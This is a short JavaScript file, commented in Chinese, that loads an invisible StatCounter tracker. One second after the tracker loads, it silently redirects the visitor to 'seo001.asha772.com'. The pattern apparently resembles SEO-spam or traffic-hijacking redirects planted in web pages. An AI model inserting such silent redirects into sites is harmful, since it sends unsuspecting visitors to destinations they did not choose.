var sc_project = 13089473;
var sc_invisible = 1;
var sc_security = "fa0c9bae";

// 创建并加载 StatCounter 脚本
var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://www.statcounter.com/counter/counter.js";
script.async = true;

script.onload = function () {
  // 脚本加载成功后执行跳转（延迟1秒保证统计图像渲染）
  setTimeout(function () {
    window.location.replace("https://seo001.asha772.com");
  }, 1000);
};

document.head.appendChild(script);

// 构造统计图像元素
var noscriptDiv = document.createElement("div");
noscriptDiv.classList.add("statcounter");

var link = document.createElement("a");
link.href = "https://statcounter.com/";
link.target = "_blank";
link.title = "Web Analytics";

var img = document.createElement("img");
img.classList.add("statcounter");
img.src = "https://c.statcounter.com/13089473/0/fa0c9bae/1/";
img.alt = "Web Analytics";
img.referrerPolicy = "no-referrer-when-downgrade";

link.appendChild(img);
noscriptDiv.appendChild(link);
document.body.appendChild(noscriptDiv);
